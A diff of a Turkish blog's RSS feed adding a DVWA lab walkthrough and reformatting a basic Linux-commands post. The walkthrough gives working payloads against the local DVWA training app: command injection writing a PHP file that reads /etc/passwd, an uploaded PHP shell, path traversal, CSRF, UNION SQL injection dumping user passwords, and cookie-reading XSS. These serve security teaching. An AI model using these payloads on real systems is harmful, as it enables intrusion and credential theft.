@@ -6,163 +6,385 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Tue, 21 Mar 2017 00:34:48 +0300</pubDate>
-    <lastBuildDate>Tue, 21 Mar 2017 00:34:48 +0300</lastBuildDate>
+    <pubDate>Mon, 27 Mar 2017 19:56:35 +0300</pubDate>
+    <lastBuildDate>Mon, 27 Mar 2017 19:56:35 +0300</lastBuildDate>
 
+    
+      <item>
+        <title>DVWA (Low-Level) Çözümleri</title>
+        <link>http://localhost:4000/dvwa-cozumler-low-level</link>
+        <pubDate>Mon, 27 Mar 2017 00:00:00 +0300</pubDate>
+        <author></author>
+        <description>&lt;p&gt;      Damn Vulnerable Web App &lt;strong&gt;(DVWA)&lt;/strong&gt;, savunmasız olan bir PHP / MySQL web uygulamasıdır. Ana hedefleri, güvenlik uzmanlarının yasal ortamda becerilerini ve araçlarını test etmelerine, web geliştiricilerinin web uygulamalarını güvence altına alma süreçlerini daha iyi anlamalarına ve öğretmenlerin / öğrencilerin sınıf ortamında web uygulaması güvenliğini öğrenmesine / öğretmesine yardımcı olmalarına yardımcı olmaktır .&lt;/p&gt;
+
+&lt;p&gt;      GNU/Linux makinanıza DVWA kurulumu için gereken adımları aşağıda listeledik.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. nano dvwa/config/config.inc.php
+
+_DVWA[ 'db_password' ] = 'sizin_sifeniz'; 
+
+2. nano /etc/php/7.0/apache2/php.ini
+
+allow_url_include = Off --&amp;gt; On      //olarak değiştiriyoruz.
+
+3. chmod -R 777 /var/www/html/dvwa  //Dosya İzini veriyoruz.
+
+4. create database dvwa;          //Veri tabanı oluşturuyoruz. 
+
+5. nano /etc/apache2/apache2.conf   //Dosyasına giderek an alt satıra 'ServerName localhost' 
+
+ekliyoruz
+
+6. /etc/init.d/apache2 start
+
+7. /etc/init.d/mysql start
+
+8. localhost/dvwa/setup.php          //Tarayıcıdan bu adrese giderek başlayabiliriz.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4&gt;Brute Force&lt;/h4&gt;
+
+&lt;p&gt;      Burada &lt;strong&gt;Burp Suite&lt;/strong&gt; aracını kullanarak parametreler yakalayacağız ve bu parametrelere kelimelere gönderip kırmaya çalışacağız. Önce Burp Suite ile tarayıcımızı senkronize çalışır hale getirmek için aşağıdaki adımları izliyoruz.&lt;/p&gt;
+
+&lt;p&gt;      Tarayıcıdan &lt;strong&gt;Preferences -&amp;gt; Advanced -&amp;gt; Network -&amp;gt; Settings&lt;/strong&gt; bölümüne geliyoruz. Burada Manual proxy configuration kısmını işaretleyip
+&lt;strong&gt;HTTP Proxy : 127.0.0.1 , Port : herhangi birşey&lt;/strong&gt; yapıp  geri kalan herşeyi boş bırakıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/brute-force/mozilla-proxy.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sonra Burp başlatıp Proxy Bölümüne geliyoruz. Buradan da &lt;strong&gt;Options&lt;/strong&gt; bölümüne gelerek &lt;strong&gt;Proxy Listener&lt;/strong&gt; sekmesine yeni bir ekleme yapıyoruz . &lt;strong&gt;Interface : 127.0.0.1 Port : 7777&lt;/strong&gt; .
+Bundan sonra Burp ile tarayıcımız senkronize çalışacak.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/brute-force/burp-add-proxy.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sonra &lt;strong&gt;Intercept&lt;/strong&gt; kısmına geliyoruz. Intercept ON ‘a tıklayıp tarayıcıdan Brute Force  kısmına giriş yapmak için bir şeyler yazıp submit 
+ediyoruz. Bu olurken BURP’ te birtakım değişiklikler olduğunu görüyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/brute-force/catch-info.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;GET&lt;/strong&gt; sonucunu aldıktan sonra gelen bütün datayı seçip &lt;strong&gt;INTRUDER&lt;/strong&gt; bölümüne gönderiyoruz. 
+Orada ‘$’ işaretlerini temizliyoruz. USERNAME ve PASSWORD kısmındakiler kalıyor. 
+Çünkü değiştirip wordlist saldirisi şeklinde bu değişkenleri yollayacağız. Oturum bilgisi ve diğer değişkenler sabit kalacak.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/brute-force/parameters.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sonrasında aynı sayfada atak tipini &lt;strong&gt;‘Cluster Bomb’&lt;/strong&gt; olarak değiştiriyoruz. Sonra &lt;strong&gt;Payloads&lt;/strong&gt; Bölümüne gelip ‘Payload Set =1’ yapıyoruz. Önce username için yollayacağımız kelimeleri
+bu payload set altına dolduruyoruz. Sonrasında ‘Payload Set =2’ yapıp burada da password için 
+yollayacağımız  kelimeleri ekliyoruz. Sonrasında ‘Options’ bölümüne geliyoruz. Burada 
+&lt;strong&gt;‘Grep-Match’&lt;/strong&gt; kısmına sonucumuz doğru olduğu takdirde dönen değerin ne olacağı tahmini yapmamız gerekiyor. Eşleştiğinde username ve password değerlerimizin doğru olduğunu anlarız.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/brute-force/result.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4&gt;Command Injection&lt;/h4&gt;
+
+&lt;p&gt;      Önce ping için istedeği ip adresini verdikten sonra şöyle yazarak :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 127.0.0.1 &amp;amp;&amp;amp; echo &quot;Ctr1l&quot; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;ping işlemlerinin altında yazdığımız komutun sonucunu görüyoruz. Buradan 
+“Command Injection” yapılabildiğini anlıyoruz.Devamında&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 192.168.0.1 &amp;amp;&amp;amp; echo &quot;&amp;lt;?php echo shell_exec('cat /etc/passwd')  ?&amp;gt;&quot; &amp;gt;&amp;gt; test.php
+2. http://localhost/DVWA-master/vulnerabilities/exec/test.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      &lt;strong&gt;Passwd&lt;/strong&gt; dosyasını ekrana bastıracak bir PHP kodu yazdık ve bunu içeriye test.php olarak yolladık. Bu sayfaya gittiğimizde passwd dosyasının içeriğini görüyoruz.&lt;/p&gt;
+
+&lt;h4&gt;CSRF&lt;/h4&gt;
+
+&lt;p&gt;      Kaynağı görüntüleyip şifre değiştirme formunu alıyoruz. Buraya göndermek istediğmiz datayı &lt;strong&gt;‘value’&lt;/strong&gt; olarak kodumuza ekliyoruz. Sonra bu verilerin nereye gideceğini belirtmemiz gerekiyor. Bunu da “http://localhost/DVWA-master/vulnerabilities/csrf/?”   olarak görüyoruz ve &lt;strong&gt;#&lt;/strong&gt; kısmını buna göre düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://localhost/DVWA-master/vulnerabilities/csrf/?&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+New password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AUTOCOMPLETE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_new&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ctr1l&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Confirm new password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AUTOCOMPLETE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_conf&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ctr1l&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Bu kodu tarayıcımızda çalıştırdığımızda asıl şifre değiştirme formumuzu doldurduğunu ve şifrenin değiştirildiğini görüyoruz.&lt;/p&gt;
+
+&lt;h4&gt;File Inclusion&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Tarayıcıdan yazdığımızda  önümüzde /etc/passwd dosyası açılıyor.
+Deneyerek dizinler arası dolaşarak farklı dosyalara ulaşabiliriz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../var/www/html/index.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4&gt;File Upload&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;?php echo shell_exec('cat /etc/passwd')  ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Bu kodu içeren dosyayı upload edip sisteme kendi php sayfamızı yüklemiş oluyoruz. Çeşitli işlemler yapacak sayfayı
+oluşturmak bize kalıyor. Bu ssayfaya gidecek olursak passwd dosyasının içeriğini görebiliriz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://localhost/DVWA-master/hackable/uploads/shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4&gt;SQL Injection&lt;/h4&gt;
+
+&lt;p&gt;      Boş alana ‘or 1 or’ yaptıktan sonra sorgu inject edebileceğimizi anlıyoruz ve tüm isimleri listeliyoruz.&lt;/p&gt;
+
+&lt;p&gt;      Sonrasında kaç tane sütunumuz olduğunu anlamak için &lt;strong&gt;‘order by 1 #, ‘order by 2 # , ‘order by 3 # &lt;/strong&gt;
+ifadelerini denerken 3’te hata alıyoruz. Buradan içeride 2 tane sütunumuz olduğunu anlıyoruz.
+Bundan sonraki ifadelerimizi buna göre yazacağız.&lt;/p&gt;
+
+&lt;p&gt;      Önce &lt;strong&gt;database&lt;/strong&gt; ve &lt;strong&gt;versiyon&lt;/strong&gt; bilgisi için şu sorguyu gönderiyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select database(),version() 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sqli/database-version.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;Tablo&lt;/strong&gt; bilgileri için şu sorguyu gönderiyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select table_name,2 from information_schema.tables #
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sqli/tables.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;Kullanıcı bilgileri&lt;/strong&gt; için gönderdiğimiz sorgu da şu şekilde :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 'union select user,password from users #
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sqli/users.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu şekilde devam ederek çeşitli bilgileri edinebiliriz.&lt;/p&gt;
+
+&lt;h4&gt;XSS (Reflected)&lt;/h4&gt;
+
+&lt;p&gt;      Gelecek olan tepkiyi görmek için şöyle bir betik yolluyoruz. Buradan gelen &lt;strong&gt;‘HELLO’&lt;/strong&gt; mesajından da anlayacağımız üzere kodlarımızı çalıştırabileceğimizi anlıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;script&amp;gt;alert(&quot;Ctr1l&quot;)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4&gt;XSS (Stored)&lt;/h4&gt;
+
+&lt;p&gt;      Reflected kısmındaki gibi bir denemeyle kod çalıştırabileceğimizi anlıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Artık kodumuz içeride saklanıyor. Her ekleme yapmak istediğimizde ekleme işleminin yanında o  kodumuz da çalışacak ve  verilen görevi yapacak.&lt;/p&gt;
+
+</description>
+      </item>
     
       <item>
         <title>Temel Linux Komutları</title>
         <link>http://localhost:4000/basic-linux-komutlari</link>
         <pubDate>Tue, 21 Mar 2017 00:00:00 +0300</pubDate>
         <author></author>
-        <description>&lt;blockquote&gt;
-  &lt;p&gt;$mkdir&lt;/p&gt;
-&lt;/blockquote&gt;
+        <description>&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;mkdir&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dizin oluşturma&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;rmdir&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dizin silme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;ls&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya ve dizin listeleme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;cd&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;çalışma dizinin değiştirme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;pwd&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;çalışma dizinini görüntüleme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;touch&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya erişim zamanını güncelleme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;rm&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya ve dizin silme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;cp&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya ve dizin kopyalama&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;mv&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya ve dizin taşıma, isim değiştirme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;file&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya türünü öğrenme&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;find&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;dosya ve dizin arama&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;a-Çevrim-İçi-klavuz-sayfaları&quot;&gt;A. Çevrim İçi Klavuz Sayfaları&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;man “komut_adı”&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Komutun kılavuz sayfasını çağırma&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;man –K directory, man –K board&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Kılavuz sayfalarında anahtar kelime aratma&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;b-haberleşme-komutları&quot;&gt;B. Haberleşme Komutları&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;wall&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Sisteme bağlı tüm kullanıcılara anlık mesaj göndermek için kullanılır.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;mesg&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;“mesg y” komutu ile mesaj gönderme izni verilir.&lt;/td&gt;
+      &lt;td&gt;“mesg n” komutu ile mesaj alımı kapatılabilir&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;$&lt;strong&gt;write “write kullanici_adi”&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;komutu ile oturum açmış kullanıcıya mesaj gönderilebilir&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“$&lt;strong&gt;write kullanici_adi” &lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;dizin oluşturma&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$rmdir&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dizin silme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$ls&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya ve dizin listeleme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$cd&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;çalıma dizinin değiştirme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$pwd&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;çalışma dizinini görüntüleme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$touch&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya erişim zamanını güncelleme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$rm&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya ve dizin silme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$cp&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya ve dizin kopyalama&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$mv&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya ve dizin taşıma, isim değiştirme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$file&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya türünü öğrenme&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$find&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dosya ve dizin arama&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;Çevrim-İçi-klavuz-sayfaları&quot;&gt;Çevrim İçi Klavuz Sayfaları&lt;/h4&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;$man &lt;komut_adı&gt;&lt;/komut_adı&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Bir komutun kılavuz sayfasını çağırmak için aşağıdaki komut kullanılabilir.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$man –K directory, man –K board&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Kılavuz sayfalarında anahtar kelime aratma&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;haberleşme-komutları&quot;&gt;Haberleşme Komutları&lt;/h4&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$wall&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sisteme bağlı tüm kullanıcılara anlık mesaj göndermek için kullanılır.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$mesg&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;“mesg y” komutu ile mesaj gönderme izni verilir.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;“mesg n” komutu ile mesaj alımı kapatılabilir.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;$write&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;“write kullanici_adi” komutu ile oturum açmış kullanıcıya mesaj gönderilebilir.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;“write kullanici_adi” komutu ile sisteme o anda giriş yapmış bulunan kullanıcılara
+  &lt;li&gt;komutu ile sisteme o anda giriş yapmış bulunan kullanıcılara
 mesaj gönderilebilir. Giriş yapmamış kullanıcılara mesaj göndermek için “mail
-kullanici_adi” komutu ile e-posta gönderilebilir.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;“write kullanici_adi” komutu verildikten sonra iletilmesi istenen mesaj yazılabilir; mesaj
-uygulamasını sonlandırmak için “Ctrl + D” tuş kombinasyonu kullanılabilir.&lt;/p&gt;
-  &lt;/li&gt;
+kullanici_adi” komutu ile e-posta gönderilebilir.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h4 id=&quot;etcmod&quot;&gt;etc/mod&lt;/h4&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;“$&lt;strong&gt;write kullanici_adi” &lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;komutu verildikten sonra iletilmesi istenen mesaj yazılabilir; mesaj
+uygulamasını sonlandırmak için “Ctrl + D” tuş kombinasyonu kullanılabilir.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;c-etcmod&quot;&gt;C. etc/mod&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;NOT&lt;/strong&gt;: Kullanıcılar oturum açtıklarında görmeleri istenilen duyurular “/etc/motd”
 dosyasına yazılmalıdır. motd (ing. Message Of The Day)&lt;/p&gt;
@@ -173,7 +395,9 @@ bu dosyaya yazarak sisteme giriş yapan herkesin ilgili mesajı görmesini
 sağlayabilirsiniz.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&quot;root&quot;&gt;root&lt;/h1&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;d-root&quot;&gt;D. root&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;UNIX sisteminizin en yetkili kullanıcısı “0” kullanıcı numarasına sahip olan
@@ -183,7 +407,9 @@ karşılığı yoktur&lt;/li&gt;
   &lt;li&gt;‘root’ dışında, ftp, nobody, mail gibi özel tanımlı kullanıcılar da vardır&lt;/li&gt;
 &lt;/ul&gt;
 
